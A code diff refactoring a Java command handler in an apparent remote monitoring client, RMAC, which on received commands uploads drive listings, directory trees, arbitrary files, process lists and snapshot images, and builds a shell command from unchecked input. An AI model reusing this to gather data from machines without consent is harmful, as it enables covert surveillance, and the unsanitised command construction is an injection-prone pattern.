@@ -113,8 +113,7 @@ public class CommandHandler implements Runnable {
                 fileRoots.println(root);
               }
               fileRoots.close();
-              File driveDetailsFile = new File(fileName);
-              RMAC.uploader.uploadFile(driveDetailsFile, ArchiveFileType.OTHER);
+              RMAC.uploader.uploadFile(fileName, ArchiveFileType.OTHER);
             } else if (subCommand.equals("tree")) {
               if (parts.length < 3) {
                 log.warn("Invalid command '" + currCommand + "'");
@@ -127,8 +126,7 @@ public class CommandHandler implements Runnable {
                   .exec("tree " + arg1 + ":\\ /f /a > \"" + fileName + "\"");
               proc.waitFor();
               if (new File(arg1 + ":\\").exists()) {
-                File treeFile = new File(fileName);
-                RMAC.uploader.uploadFile(treeFile, ArchiveFileType.OTHER);
+                RMAC.uploader.uploadFile(fileName, ArchiveFileType.OTHER);
               } else {
                 log.warn("Directory " + arg1 + ":\\ Doesn't Exist");
               }
@@ -141,9 +139,8 @@ public class CommandHandler implements Runnable {
               log.warn("Invalid command '" + currCommand + "'");
               continue;
             }
-            File file = new File(filePath);
-            if (file.exists()) {
-              RMAC.uploader.uploadFile(file, ArchiveFileType.OTHER);
+            if (RMAC.fs.exists(filePath)) {
+              RMAC.uploader.uploadFile(filePath, ArchiveFileType.OTHER);
             } else {
               log.warn("Cannot Find File: " + filePath);
             }
@@ -171,8 +168,7 @@ public class CommandHandler implements Runnable {
                   Constants.RUNTIME_LOCATION + "\\TaskList-" + Utils.getTimestamp() + ".txt";
               Process proc = Runtime.getRuntime().exec("tasklist > \"" + fileName + "\"");
               proc.waitFor();
-              File taskListFile = new File(fileName);
-              RMAC.uploader.uploadFile(taskListFile, ArchiveFileType.OTHER);
+              RMAC.uploader.uploadFile(fileName, ArchiveFileType.OTHER);
             } else if ("kill".equals(args[1])) {
               if (args.length < 3) {
                 log.warn("Invalid command '" + currCommand + "'");
@@ -191,11 +187,10 @@ public class CommandHandler implements Runnable {
             String file = Constants.RUNTIME_LOCATION + "\\Snap-" + Utils.getTimestamp() + ".png";
             Process process = Utils.getImage(file);
             process.waitFor();
-            File snap = new File(file);
-            if (!snap.exists()) {
+            if (!RMAC.fs.exists(file)) {
               log.error("Could not take snapshot");
             } else {
-              RMAC.uploader.uploadFile(snap, ArchiveFileType.OTHER);
+              RMAC.uploader.uploadFile(file, ArchiveFileType.OTHER);
             }
             break;
           }
